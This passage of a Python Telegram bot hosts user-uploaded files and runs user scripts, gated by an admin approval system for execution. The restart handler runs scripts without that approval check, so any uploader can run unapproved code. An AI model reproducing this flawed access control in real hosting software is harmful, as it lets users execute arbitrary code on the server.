                types.InlineKeyboardButton("🗑️ Delete", callback_data=f'delete_{user_id}_{file_name}')
            )

        markup.add(
            types.InlineKeyboardButton("🔙 Back", callback_data=f'back_files_{user_id}')
        )

        status = "🟢 Running" if file_type == 'executable' and is_bot_running(user_id, file_name) else "⭕ Stopped" if file_type == 'executable' else "📁 Hosted"

        control_text = f"🔧 File Control Panel\n\n"
        control_text += f"📄 File: {file_name}\n"
        control_text += f"📁 Type: {file_type}\n"
        control_text += f"🔄 Status: {status}\n"

        if file_type == 'executable' and is_running:
            uptime = get_script_uptime(user_id, file_name)
            if uptime:
                control_text += f"⏱️ Uptime: {uptime}\n"

        control_text += f"💾 Storage: Permanent\n"
        control_text += f"👤 Owner: {user_id}\n\n"

        if file_type == 'executable' and not is_running:
            control_text += f"⚠️ **IMPORTANT:** Execution requires owner approval.\n"
            control_text += f"Click 'Request Execution' to send approval request.\n\n"

        control_text += f"🎛️ Choose an action:"

        bot.edit_message_text(
            control_text,
            call.message.chat.id,
            call.message.message_id,
            reply_markup=markup,
            parse_mode="Markdown"
        )

        bot.answer_callback_query(call.id, f"Control panel for {file_name}")

    except Exception as e:
        logger.error(f"Error in file control handler: {e}")
        bot.answer_callback_query(call.id, "❌ Error occurred!")

# --- NEW: Request Execution Handler ---
@bot.callback_query_handler(func=lambda call: call.data.startswith('request_exec_'))
def handle_request_execution(call):
    try:
        parts = call.data.split('_', 3)
        user_id = int(parts[2])
        file_name = parts[3]

        if call.from_user.id != user_id and call.from_user.id not in admin_ids:
            bot.answer_callback_query(call.id, "🚫 Access denied!")
            return

        if call.from_user.id != OWNER_ID and user_id != OWNER_ID:
            # Check if user is owner - owner can bypass
            user_folder = get_user_folder(user_id)
            file_path = os.path.join(user_folder, file_name)

            if not os.path.exists(file_path):
                bot.answer_callback_query(call.id, "❌ File not found!")
                return

            if is_bot_running(user_id, file_name):
                bot.answer_callback_query(call.id, "⚠️ Already running!")
                return

            # Send execution request to owner
            user_info = get_user_info(user_id)

            bot.edit_message_text(
                f"⚡ Sending execution request to owner...",
                call.message.chat.id,
                call.message.message_id
            )

            exec_id = send_execution_request_to_owner(user_id, file_name, file_path, user_info)

            if exec_id:
                success_msg = f"✅ EXECUTION REQUEST SENT\n\n"
                success_msg += f"📄 File: {file_name}\n"
                success_msg += f"⏰ Status: Sent to owner for approval\n\n"
                success_msg += f"📩 The file owner (@doxbinyetkili) will review your request.\n"
                success_msg += f"⏳ You will be notified when it's approved or rejected.\n\n"
                success_msg += f"⚠️ Please wait for the review process."

                bot.edit_message_text(
                    success_msg,
                    call.message.chat.id,
                    call.message.message_id
                )
            else:
                bot.edit_message_text(
                    "❌ Error sending execution request. Please try again.",
                    call.message.chat.id,
                    call.message.message_id
                )
        else:
            # Owner can execute directly
            user_folder = get_user_folder(user_id)
            file_path = os.path.join(user_folder, file_name)

            if not os.path.exists(file_path):
                bot.answer_callback_query(call.id, "❌ File not found!")
                return

            if is_bot_running(user_id, file_name):
                bot.answer_callback_query(call.id, "⚠️ Already running!")
                return

            start_time = time.time()
            success, result = execute_script(user_id, file_path, call.message)
            execution_time = round(time.time() - start_time, 2)

            if success:
                bot.answer_callback_query(call.id, f"🟢 Started in {execution_time}s!")
                log_script_execution(user_id, file_name, "🟢 STARTED (Owner)", execution_time)
            else:
                bot.answer_callback_query(call.id, f"❌ Start failed: {result}")

        bot.answer_callback_query(call.id)

    except Exception as e:
        logger.error(f"Error requesting execution: {e}")
        bot.answer_callback_query(call.id, "❌ Error occurred!")

# --- Start File Handler (now sends approval request) ---
@bot.callback_query_handler(func=lambda call: call.data.startswith('start_'))
def handle_start_file(call):
    # Redirect to request_exec handler
    parts = call.data.split('_', 2)
    if len(parts) == 3:
        user_id = parts[1]
        file_name = parts[2]
        call.data = f'request_exec_{user_id}_{file_name}'
        handle_request_execution(call)
    else:
        bot.answer_callback_query(call.id, "❌ Invalid request")

# --- Stop File Handler ---
@bot.callback_query_handler(func=lambda call: call.data.startswith('stop_'))
def handle_stop_file(call):
    try:
        parts = call.data.split('_', 2)
        user_id = int(parts[1])
        file_name = parts[2]

        if call.from_user.id != user_id and call.from_user.id not in admin_ids:
            bot.answer_callback_query(call.id, "🚫 Access denied!")
            return

        script_key = f"{user_id}_{file_name}"
        script_info = bot_scripts.get(script_key)

        if script_info and script_info.get('process'):
            try:
                runtime = get_script_uptime(user_id, file_name) or "Unknown"

                process = script_info['process']
                process.terminate()
                process.wait(timeout=5)

                remove_running_script(user_id, file_name)

                if script_key in bot_scripts:
                    del bot_scripts[script_key]

                bot.answer_callback_query(call.id, f"🔴 Stopped! Runtime: {runtime}")
                call.data = f'control_{user_id}_{file_name}'
                handle_file_control(call)
                log_script_execution(user_id, file_name, "🔴 STOPPED")
            except Exception as e:
                bot.answer_callback_query(call.id, f"❌ Stop failed: {str(e)}")
        else:
            bot.answer_callback_query(call.id, "⚠️ Not running!")

    except Exception as e:
        logger.error(f"Error stopping file: {e}")
        bot.answer_callback_query(call.id, "❌ Error occurred!")

# --- Restart File Handler ---
@bot.callback_query_handler(func=lambda call: call.data.startswith('restart_'))
def handle_restart_file(call):
    try:
        parts = call.data.split('_', 2)
        user_id = int(parts[1])
        file_name = parts[2]

        if call.from_user.id != user_id and call.from_user.id not in admin_ids:
            bot.answer_callback_query(call.id, "🚫 Access denied!")
            return

        script_key = f"{user_id}_{file_name}"
        script_info = bot_scripts.get(script_key)

        if script_info and script_info.get('process'):
            try:
                process = script_info['process']
                process.terminate()
                process.wait(timeout=5)
                remove_running_script(user_id, file_name)
                if script_key in bot_scripts:
                    del bot_scripts[script_key]
            except:
                pass

        user_folder = get_user_folder(user_id)
        file_path = os.path.join(user_folder, file_name)

        if os.path.exists(file_path):
            start_time = time.time()
            success, result = execute_script(user_id, file_path, call.message)
            execution_time = round(time.time() - start_time, 2)

            if success:
                bot.answer_callback_query(call.id, f"🔄 Restarted in {execution_time}s!")
                call.data = f'control_{user_id}_{file_name}'
                handle_file_control(call)
                log_script_execution(user_id, file_name, "🔄 RESTARTED", execution_time)
            else:
                bot.answer_callback_query(call.id, f"❌ Restart failed: {result}")
        else:
            bot.answer_callback_query(call.id, "❌ File not found!")

    except Exception as e:
        logger.error(f"Error restarting file: {e}")
        bot.answer_callback_query(call.id, "❌ Error occurred!")

# --- Logs Handler ---
@bot.callback_query_handler(func=lambda call: call.data.startswith('logs_'))
def handle_show_logs(call):
    try:
        parts = call.data.split('_', 2)
        user_id = int(parts[1])
        file_name = parts[2]

        if call.from_user.id != user_id and call.from_user.id not in admin_ids:
            bot.answer_callback_query(call.id, "🚫 Access denied!")
            return

        script_key = f"{user_id}_{file_name}"
        script_info = bot_scripts.get(script_key)

        if script_info and 'log_file_path' in script_info:
            log_file_path = script_info['log_file_path']

            if os.path.exists(log_file_path):
                try:
                    with open(log_file_path, 'r') as f:
                        logs = f.read().strip()

                    if logs:
                        # Format logs as requested
                        logs_text = f"📜 Logs for {file_name} (User {user_id}):\n\n"

                        # Check for errors in logs
                        if "error" in logs.lower() or "traceback" in logs.lower() or "exception" in logs.lower():
                            # Show actual error
                            error_lines = []
                            lines = logs.split('\n')
                            for line in lines:
                                if any(word in line.lower() for word in ['error', 'traceback', 'exception', 'failed']):
                                    error_lines.append(line)

                            if error_lines:
                                logs_text += "❌ Error Found:\n"
                                logs_text += "\n".join(error_lines[:5])  # Show first 5 error lines
                            else:
                                logs_text += " No Error"
                        else:
                            logs_text += " No Error"
                    else:
                        logs_text = f"📜 Logs for {file_name} (User {user_id}):\n No Error"

                    # Send the formatted logs
                    bot.send_message(call.message.chat.id, logs_text)
                    bot.answer_callback_query(call.id, "📜 Logs sent!")

                except Exception as e:
                    error_text = f"📜 Logs for {file_name} (User {user_id}):\n Error reading logs: {str(e)}"
                    bot.send_message(call.message.chat.id, error_text)
                    bot.answer_callback_query(call.id, f"❌ Error reading logs")
            else:
                error_text = f"📜 Logs for {file_name} (User {user_id}):\n No log file found"
                bot.send_message(call.message.chat.id, error_text)
                bot.answer_callback_query(call.id, "❌ Log file not found!")
        else:
            error_text = f"📜 Logs for {file_name} (User {user_id}):\n No Error available"
            bot.send_message(call.message.chat.id, error_text)
            bot.answer_callback_query(call.id, "❌ No logs available!")

    except Exception as e:
        logger.error(f"Error showing logs: {e}")
        bot.answer_callback_query(call.id, "❌ Error occurred!")

# --- Delete File Handler ---
@bot.callback_query_handler(func=lambda call: call.data.startswith('delete_'))
def handle_delete_file(call):
    try:
        parts = call.data.split('_', 2)
        user_id = int(parts[1])
        file_name = parts[2]

        if call.from_user.id != user_id and call.from_user.id not in admin_ids:
            bot.answer_callback_query(call.id, "🚫 Access denied!")
            return

        script_key = f"{user_id}_{file_name}"
        if script_key in bot_scripts:
            try:
                process = bot_scripts[script_key]['process']
                process.terminate()
                remove_running_script(user_id, file_name)
                del bot_scripts[script_key]
            except:
                pass

        user_folder = get_user_folder(user_id)
        file_path = os.path.join(user_folder, file_name)

        if os.path.exists(file_path):
            os.remove(file_path)

        if user_id in user_files:
            user_files[user_id] = [(fn, ft) for fn, ft in user_files[user_id] if fn != file_name]

        try:
            conn = sqlite3.connect(DATABASE_PATH, check_same_thread=False)
            c = conn.cursor()
            c.execute('DELETE FROM user_files WHERE user_id = ? AND file_name = ?', (user_id, file_name))
            c.execute('DELETE FROM running_scripts WHERE user_id = ? AND file_name = ?', (user_id, file_name))
            conn.commit()
            conn.close()
        except Exception as e:
            logger.error(f"Database error deleting file: {e}")

        # Update persistent data
        save_persistent_data()

        bot.answer_callback_query(call.id, f"🗑️ {file_name} deleted!")

        call.data = f'back_files_{user_id}'
        handle_back_to_files(call)

        send_to_log_channel(f"🗑️ FILE DELETED\n\nUser ID: {user_id}\nFile: {file_name}\nTime: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")

    except Exception as e:
        logger.error(f"Error deleting file: {e}")
        bot.answer_callback_query(call.id, "❌ Error occurred!")

# --- Back to Files Handler ---
@bot.callback_query_handler(func=lambda call: call.data.startswith('back_files_'))
def handle_back_to_files(call):
    try:
        parts = call.data.split('_', 2)
        user_id = int(parts[2])

        files = user_files.get(user_id, [])

        if not files:
            files_text = "📂 Your Files\n\n🔒 No files uploaded yet.\n\n💡 Upload any file type to begin!"
            markup = None
        else:
            files_text = "🔒 Your Files:\n\n📁 Click on any file to manage it:\n\n"
            files_text += "⚠️ **Note:** Executable files require owner approval to run.\n\n"

            markup = types.InlineKeyboardMarkup(row_width=1)

            for i, (file_name, file_type) in enumerate(files, 1):
                if file_type == 'executable':
                    is_running = is_bot_running(user_id, file_name)
                    status = "🟢 Running" if is_running else "⭕ Stopped"
                    icon = "🚀"

                    if is_running:
                        uptime = get_script_uptime(user_id, file_name)
                        if uptime:
                            status += f" (Uptime: {uptime})"

                    files_text += f"{i}. {file_name} ({file_type})\n   Status: {status}\n\n"
                else:
                    status = "📁 Hosted"
                    icon = "📄"
                    file_hash = hashlib.md5(f"{user_id}_{file_name}".encode()).hexdigest()

                    domain = os.environ.get('REPL_SLUG', 'universal-file-host')
                    owner = os.environ.get('REPL_OWNER', 'replit-user')

                    try:
                        replit_url = f"https://{domain}.{owner}.repl.co"
                        test_response = requests.get(f"{replit_url}/health", timeout=2)
                        if test_response.status_code != 200:
                            replit_url = f"https://{domain}-{owner}.replit.app"
                    except:
                        replit_url = f"https://{domain}-{owner}.replit.app"

                    file_url = f"{replit_url}/file/{file_hash}"
                    files_text += f"{i}. {file_name} ({file_type})\n   Status: {status}\n   🔗 Access: {file_url}\n\n"

                markup.add(types.InlineKeyboardButton(
                    f"{icon} {file_name} - {status}",
                    callback_data=f'control_{user_id}_{file_name}'
                ))

            files_text += "⚙️ Management Options:\n• 🟢 Request Execution (owner approval required)\n• 🔴 Stop running files\n• 🗑️ Delete files\n• 📜 View execution logs\n• 🔄 Restart running files"

        bot.edit_message_text(
            files_text,
            call.message.chat.id,
            call.message.message_id,
            reply_markup=markup,
            parse_mode="Markdown"
        )

        bot.answer_callback_query(call.id, "📂 Files list updated!")

    except Exception as e:
        logger.error(f"Error going back to files: {e}")
        bot.answer_callback_query(call.id, "❌ Error occurred!")

# --- New Callback Handlers for Approval System ---
@bot.callback_query_handler(func=lambda call: call.data.startswith('approve_'))
def handle_approve_file(call):
    """Handle file approval from inline button"""
    try:
        if call.from_user.id not in admin_ids:
            bot.answer_callback_query(call.id, "🚫 Only admins can approve files!")
            return

        approval_id = call.data.split('_')[1]
        success, result = approve_file(approval_id)

        if success:
            bot.answer_callback_query(call.id, "✅ File approved!")
            bot.edit_message_text(
                f"✅ FILE APPROVED\n\n{result}",
                call.message.chat.id,
                call.message.message_id
            )
        else:
            bot.answer_callback_query(call.id, f"❌ {result}")

    except Exception as e:
        logger.error(f"Error in approve callback: {e}")
        bot.answer_callback_query(call.id, "❌ Error occurred!")

@bot.callback_query_handler(func=lambda call: call.data.startswith('reject_'))
def handle_reject_file(call):
    """Handle file rejection from inline button"""
    try:
        if call.from_user.id not in admin_ids:
            bot.answer_callback_query(call.id, "🚫 Only admins can reject files!")
            return

        approval_id = call.data.split('_')[1]
        success, result = reject_file(approval_id)

        if success:
            bot.answer_callback_query(call.id, "❌ File rejected!")
            bot.edit_message_text(
                f"❌ FILE REJECTED\n\n{result}",
                call.message.chat.id,
                call.message.message_id
            )
        else:
            bot.answer_callback_query(call.id, f"❌ {result}")

    except Exception as e:
        logger.error(f"Error in reject callback: {e}")
        bot.answer_callback_query(call.id, "❌ Error occurred!")

@bot.callback_query_handler(func=lambda call: call.data.startswith('view_'))
def handle_view_file(call):
    """Handle view file content request"""
    try:
        if call.from_user.id not in admin_ids:
            bot.answer_callback_query(call.id, "🚫 Only admins can view file content!")
            return

        approval_id = call.data.split('_')[1]
        content = view_file_content(approval_id)

        if content:
            # Send content as separate message (Telegram has message length limits)
            content_preview = f"📄 FILE CONTENT PREVIEW\n\n```\n{content}\n```"

            if len(content_preview) > 4000:
                content_preview = content_preview[:4000] + "\n\n... (content truncated)"

            bot.send_message(call.message.chat.id, content_preview, parse_mode='Markdown')
            bot.answer_callback_query(call.id, "📄 Content sent!")
        else:
            bot.answer_callback_query(call.id, "❌ Cannot read file content")

    except Exception as e:
        logger.error(f"Error in view callback: {e}")
        bot.answer_callback_query(call.id, "❌ Error occurred!")

@bot.callback_query_handler(func=lambda call: call.data.startswith('contact_'))
def handle_contact_user(call):
    """Handle contact user request"""
    try:
        if call.from_user.id not in admin_ids:
            bot.answer_callback_query(call.id, "🚫 Only admins can contact users!")
            return

        approval_id = call.data.split('_')[1]

        if approval_id not in pending_approvals:
            bot.answer_callback_query(call.id, "❌ Approval request not found")
            return

        approval_data = pending_approvals[approval_id]
        user_id = approval_data['user_id']
        user_info = approval_data['user_info']

        contact_msg = f"👤 USER CONTACT INFO\n\n"
        contact_msg += f"Name: {user_info['first_name']} {user_info['last_name'] or ''}\n"
        contact_msg += f"User ID: {user_id}\n"
        contact_msg += f"Username: @{user_info['username'] or 'None'}\n"
        contact_msg += f"File: {approval_data['file_name']}\n"
        contact_msg += f"Issue: {approval_data['security_issue']}\n\n"
        contact_msg += f"💬 You can contact the user directly at: tg://user?id={user_id}"

        bot.send_message(call.message.chat.id, contact_msg)
        bot.answer_callback_query(call.id, "👤 User info sent!")

    except Exception as e:
        logger.error(f"Error in contact callback: {e}")
        bot.answer_callback_query(call.id, "❌ Error occurred!")

# --- NEW: Execution Approval Callback Handlers ---
@bot.callback_query_handler(func=lambda call: call.data.startswith('exec_approve_'))
def handle_exec_approve(call):
    """Handle execution approval from inline button"""
    try:
        if call.from_user.id not in admin_ids:
            bot.answer_callback_query(call.id, "🚫 Only admins can approve executions!")
            return

        exec_id = call.data.split('_')[2]

        # Get the update message for the user
        success, result = approve_execution(exec_id, call.message)

        if success:
            bot.answer_callback_query(call.id, "✅ Execution approved!")
            bot.edit_message_text(
                f"✅ EXECUTION APPROVED\n\n{result}",
                call.message.chat.id,
                call.message.message_id
            )
        else:
            bot.answer_callback_query(call.id, f"❌ {result}")

    except Exception as e:
        logger.error(f"Error in exec approve callback: {e}")
        bot.answer_callback_query(call.id, "❌ Error occurred!")

@bot.callback_query_handler(func=lambda call: call.data.startswith('exec_reject_'))
def handle_exec_reject(call):
    """Handle execution rejection from inline button"""
    try:
        if call.from_user.id not in admin_ids:
            bot.answer_callback_query(call.id, "🚫 Only admins can reject executions!")
            return

        exec_id = call.data.split('_')[2]
        success, result = reject_execution(exec_id)

        if success:
            bot.answer_callback_query(call.id, "❌ Execution rejected!")
            bot.edit_message_text(
                f"❌ EXECUTION REJECTED\n\n{result}",
                call.message.chat.id,
                call.message.message_id
            )
        else:
            bot.answer_callback_query(call.id, f"❌ {result}")

    except Exception as e:
        logger.error(f"Error in exec reject callback: {e}")
        bot.answer_callback_query(call.id, "❌ Error occurred!")

@bot.callback_query_handler(func=lambda call: call.data.startswith('exec_view_'))
def handle_exec_view(call):
    """Handle view execution file content request"""
    try:
        if call.from_user.id not in admin_ids:
            bot.answer_callback_query(call.id, "🚫 Only admins can view file content!")
            return

        exec_id = call.data.split('_')[2]
        content = view_execution_file(exec_id)

        if content:
            # Send content as separate message
            content_preview = f"📄 EXECUTION FILE CONTENT\n\n```\n{content}\n```"

            if len(content_preview) > 4000:
                content_preview = content_preview[:4000] + "\n\n... (content truncated)"

            bot.send_message(call.message.chat.id, content_preview, parse_mode='Markdown')
            bot.answer_callback_query(call.id, "📄 Content sent!")
        else:
            bot.answer_callback_query(call.id, "❌ Cannot read file content")

    except Exception as e:
        logger.error(f"Error in exec view callback: {e}")
        bot.answer_callback_query(call.id, "❌ Error occurred!")

@bot.callback_query_handler(func=lambda call: call.data.startswith('exec_contact_'))
def handle_exec_contact(call):
    """Handle contact user for execution request"""
    try:
        if call.from_user.id not in admin_ids:
            bot.answer_callback_query(call.id, "🚫 Only admins can contact users!")
            return

        exec_id = call.data.split('_')[2]

        if exec_id not in pending_executions:
            bot.answer_callback_query(call.id, "❌ Execution request not found")
            return

        exec_data = pending_executions[exec_id]
        user_id = exec_data['user_id']
        user_info = exec_data['user_info']

        contact_msg = f"👤 USER CONTACT INFO (EXECUTION REQUEST)\n\n"
        contact_msg += f"Name: {user_info['first_name']} {user_info['last_name'] or ''}\n"
        contact_msg += f"User ID: {user_id}\n"
        contact_msg += f"Username: @{user_info['username'] or 'None'}\n"
        contact_msg += f"File: {exec_data['file_name']}\n"
        contact_msg += f"Request Time: {exec_data['request_time'].strftime('%Y-%m-%d %H:%M:%S')}\n\n"
        contact_msg += f"💬 You can contact the user directly at: tg://user?id={user_id}"

        bot.send_message(call.message.chat.id, contact_msg)
        bot.answer_callback_query(call.id, "👤 User info sent!")

    except Exception as e:
        logger.error(f"Error in exec contact callback: {e}")
        bot.answer_callback_query(call.id, "❌ Error occurred!")

# --- No-op handler for informational buttons ---
@bot.callback_query_handler(func=lambda call: call.data == "noop")
def handle_noop(call):
    bot.answer_callback_query(call.id, "ℹ️ This is an information message")

# --- Catch all handler for unsupported messages ---
@bot.message_handler(func=lambda message: True)
def handle_all_messages(message):
    if message.from_user.id in broadcast_mode and broadcast_mode[message.from_user.id]:
        handle_broadcast_message(message)
        return

    safe_reply_to(message, "🔒 Use the menu buttons or send /start for help.")

# --- Cleanup and Startup ---
def cleanup_on_exit():
    """Ultimate cleanup on exit"""
    logger.info("🛡️ Performing ultimate cleanup...")

    create_backup()
    save_persistent_data()

    for script_key, script_info in bot_scripts.items():
        try:
            process = script_info.get('process')
            if process and process.poll() is None:
                process.terminate()
                logger.info(f"Terminated script: {script_key}")
        except Exception as e:
            logger.error(f"Error terminating script {script_key}: {e}")

    for user_id, clone_info in user_clones.items():
        try:
            process = clone_info.get('process')
            if process and process.poll() is None:
                process.terminate()
                logger.info(f"Terminated clone for user: {user_id}")
        except Exception as e:
            logger.error(f"Error terminating clone for user {user_id}: {e}")

def send_startup_message():
    """Send startup message to log channel"""
    try:
        bot_info = bot.get_me()
        startup_msg = f"🚀 BOT STARTED - ULTIMATE PROTECTION\n\n"
        startup_msg += f"🤖 Bot: @{bot_info.username}\n"
        startup_msg += f"👥 Users: {len(active_users)}\n"
        startup_msg += f"📁 Files: {sum(len(files) for files in user_files.values())}\n"
        startup_msg += f"🚀 Scripts: {len(bot_scripts)}\n"
        startup_msg += f"🤖 Clones: {len(user_clones)}\n"
        startup_msg += f"🔄 Pending Approvals: {len(pending_approvals)}\n"
        startup_msg += f"⚡ Pending Executions: {len(pending_executions)}\n"
        startup_msg += f"👥 Total Referrals: {sum(stats.get('total', 0) for stats in referral_stats.values())}\n"
        startup_msg += f"🛡️ Protection: 100% ACTIVE\n"
        startup_msg += f"💾 Data Saves: {get_save_count()}\n"
        startup_msg += f"⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"

        send_to_log_channel(startup_msg)
    except Exception as e:
        logger.error(f"Error sending startup message: {e}")

if __name__ == "__main__":
    atexit.register(cleanup_on_exit)

    init_db()
    load_data()

    keep_alive()
    start_background_tasks()

    logger.info("🚀 Starting ULTIMATE PROTECTION BOT WITH ALL FEATURES...")

    try:
        bot_info = bot.get_me()
        logger.info(f"Bot connected: @{bot_info.username}")

        print(f"🤖 ULTIMATE PROTECTION BOT STARTED!")
        print(f"🛡️ 100% Data Protection: ACTIVE")
        print(f"✅ Owner Approval System: ENABLED")
        print(f"⚡ Execution Approval Required: ENABLED")
        print(f"👥 Referral System: ENABLED (2 referrals = 1 slot)")
        print(f"📢 Broadcast to All Users: ENABLED")
        print(f"💾 Persistent Data: ENABLED")
        print(f"🔄 Auto-restart: ENABLED")
        print(f"📊 Users preserved: {len(active_users)}")
        print(f"📁 Files secured: {sum(len(files) for files in user_files.values())}")
        print(f"🔄 Pending uploads: {len(pending_approvals)}")
        print(f"⚡ Pending executions: {len(pending_executions)}")
        print(f"👥 Total referrals: {sum(stats.get('total', 0) for stats in referral_stats.values())}")
        print(f"🚀 Scripts auto-restarted: {len(bot_scripts)}")
        print(f"🤖 Clones auto-restarted: {len(user_clones)}")
        print(f"💾 Data saves: {get_save_count()}")

        send_startup_message()

        create_backup()
        save_persistent_data()

        bot.infinity_polling(timeout=10, long_polling_timeout=5, none_stop=True, interval=0)
    except Exception as e:
        logger.error(f"Bot error: {e}")
        print(f"❌ Bot connection failed: {e}")
        sys.exit(1)
